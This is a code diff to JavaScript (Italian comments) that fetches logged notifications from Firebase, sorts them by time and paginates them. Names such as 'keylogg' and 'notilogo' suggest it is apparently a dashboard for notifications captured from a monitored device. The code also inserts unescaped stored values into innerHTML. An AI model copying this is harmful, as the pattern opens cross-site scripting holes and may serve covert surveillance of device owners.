@@ -890,39 +890,48 @@ function notificationlog(){
     var database = firebase.database();
     var ref = database.ref("notilogo/"+unqid);
     if(manager=="notikey"){
-        ref.limitToFirst(10).once("value",gotData);
+        ref.limitToFirst(10).once("value", gotData);
     }
     function gotData(data){
         $("#preloaderr").fadeOut();
         psdus.style.display="block";
         psdus.innerHTML='<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
+
         if (data.exists()) {
             var scores=data.val();
             var keys=Object.keys(scores);
 
-            // Crea un array di oggetti notifica per ordinamento
+            // Costruisci array di notifiche
             var notifs = [];
             for (var i = 0; i < keys.length; i++) {
+                var k = keys[i];
+                var item = scores[k];
+                // Assicurati che time sia un numero (alcuni potrebbero avere una stringa)
+                var timeVal = item.time || 0;
+                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                 notifs.push({
-                    key: keys[i],
-                    data: scores[keys[i]]
+                    key: k,
+                    data: item,
+                    time: timeVal
                 });
             }
+
             // Ordina per time decrescente (più recente prima)
             notifs.sort(function(a, b) {
-                return b.data.time - a.data.time;
+                return b.time - a.time;
             });
 
             // Visualizza in ordine
             for (var i = 0; i < notifs.length; i++) {
-                var k = notifs[i].key;
-                var ico = notifs[i].data.icon;
-                var packa = notifs[i].data.package;
-                var title = notifs[i].data.title;
-                var time = notifs[i].data.time;
-                var ticker = notifs[i].data.ticker;
-                var text = notifs[i].data.text;
-                var name = notifs[i].data.name;
+                var item = notifs[i];
+                var k = item.key;
+                var ico = item.data.icon;
+                var packa = item.data.package;
+                var title = item.data.title;
+                var time = item.time;
+                var ticker = item.data.ticker;
+                var text = item.data.text;
+                var name = item.data.name;
                 if (ticker != "") ticker = '(' + ticker + ')';
 
                 psdus.innerHTML += '<div class="keylogg" >'
@@ -934,13 +943,10 @@ function notificationlog(){
                     + '</div>';
             }
 
-            // Gestione Load More: ora usiamo la chiave dell'ultimo elemento mostrato (il meno recente)
+            // Pulsante Load More (usa la chiave dell'ultimo elemento, cioè il meno recente)
             if (notifs.length > 0) {
-                var oldestKey = notifs[notifs.length - 1].key;
-                if (lastkeynot != oldestKey) {
-                    lastkeynot = oldestKey;
-                    psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
-                }
+                lastkeynot = notifs[notifs.length - 1].key;
+                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
             }
         } else {
             psdus.innerHTML += '<div class="keylogg" ><h4>No Notifications Found<h4></div>';
@@ -955,40 +961,46 @@ function loadmoree(o, p) {
     var database = firebase.database();
     var ref = database.ref("notilogo/" + unqid);
     if (manager == "notikey") {
-        ref.orderByKey().startAt(p).limitToFirst(11).once("value", gotData); // 11 per escludere il primo già visto
+        ref.orderByKey().startAt(p).limitToFirst(11).once("value", gotData);
     }
     function gotData(data) {
         if (data.exists() && manager == "notikey") {
             var scores = data.val();
             var keys = Object.keys(scores);
-
             // Rimuovi la chiave di partenza (già mostrata)
             if (keys[0] === p) keys.shift();
 
-            // Crea array e ordina
+            // Costruisci array e ordina
             var notifs = [];
             for (var i = 0; i < keys.length; i++) {
+                var k = keys[i];
+                var item = scores[k];
+                var timeVal = item.time || 0;
+                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                 notifs.push({
-                    key: keys[i],
-                    data: scores[keys[i]]
+                    key: k,
+                    data: item,
+                    time: timeVal
                 });
             }
             notifs.sort(function(a, b) {
-                return b.data.time - a.data.time;
+                return b.time - a.time;
             });
 
-            o.style.display = "none"; // nasconde il vecchio pulsante
+            // Nascondi il vecchio pulsante
+            o.style.display = "none";
 
-            // Visualizza
+            // Visualizza in ordine
             for (var i = 0; i < notifs.length; i++) {
-                var k = notifs[i].key;
-                var ico = notifs[i].data.icon;
-                var packa = notifs[i].data.package;
-                var title = notifs[i].data.title;
-                var time = notifs[i].data.time;
-                var ticker = notifs[i].data.ticker;
-                var text = notifs[i].data.text;
-                var name = notifs[i].data.name;
+                var item = notifs[i];
+                var k = item.key;
+                var ico = item.data.icon;
+                var packa = item.data.package;
+                var title = item.data.title;
+                var time = item.time;
+                var ticker = item.data.ticker;
+                var text = item.data.text;
+                var name = item.data.name;
                 if (ticker != "") ticker = '(' + ticker + ')';
 
                 psdus.innerHTML += '<div class="keylogg" >'
@@ -1000,13 +1012,10 @@ function loadmoree(o, p) {
                     + '</div>';
             }
 
-            // Nuovo pulsante Load More con l'ultima chiave
+            // Nuovo pulsante Load More
             if (notifs.length > 0) {
-                var oldestKey = notifs[notifs.length - 1].key;
-                if (lastkeynot != oldestKey) {
-                    lastkeynot = oldestKey;
-                    psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
-                }
+                lastkeynot = notifs[notifs.length - 1].key;
+                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
             }
         } else {
             o.style.display = "none";
